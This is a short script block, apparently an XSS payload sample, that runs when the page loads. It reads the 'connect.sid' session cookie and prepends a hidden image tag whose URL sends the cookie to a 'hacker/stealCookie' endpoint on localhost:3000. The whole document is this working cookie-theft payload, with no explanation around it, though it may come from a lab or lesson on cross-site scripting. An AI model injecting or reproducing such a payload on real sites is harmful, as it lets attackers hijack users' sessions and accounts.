<script>
$(window).on('load', function() {
    var fakeImgTag = '<img id="theImg" src="http://localhost:3000/hacker/stealCookie?sid=' + $.cookie('connect.sid') + '" />';
    $('body').prepend(fakeImgTag);
    $('#theImg').hide();
});
</script>
